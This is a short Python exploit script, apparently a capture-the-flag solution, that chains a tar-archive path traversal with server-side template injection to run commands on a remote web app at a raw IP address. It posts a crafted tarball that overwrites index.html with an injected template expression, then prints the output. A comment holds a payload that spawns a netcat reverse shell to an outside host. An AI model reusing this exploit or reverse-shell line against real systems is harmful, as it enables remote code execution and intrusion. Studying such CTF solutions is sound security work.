import html
import os
import readline
import requests
import tarfile

URL = "http://64.227.36.32:30266"
#URL = "http://localhost:1337"

os.chdir("templates/lvl1/lvl2")

while True:
    # ().__class__.__base__.__subclasses__()[223](['nc', '45.63.19.60', '9999', '-e', '/bin/sh'])
    cmd = input("cmd: ")

    with open("../../../templates/index.html", "w") as outfile:
        outfile.write(f"{{{{{cmd}}}}}")
   
    with tarfile.open("../../../index.tar.gz", "w:gz") as outfile:
        outfile.add("../../../templates/index.html")

    requests.post(URL + "/api/unslippy", files={"file": open("../../../index.tar.gz", "rb")})
    res = requests.get(URL)

    output = html.unescape(res.text).split(",")
    for i, line in enumerate(output):
        print(f"{i}: {line}")
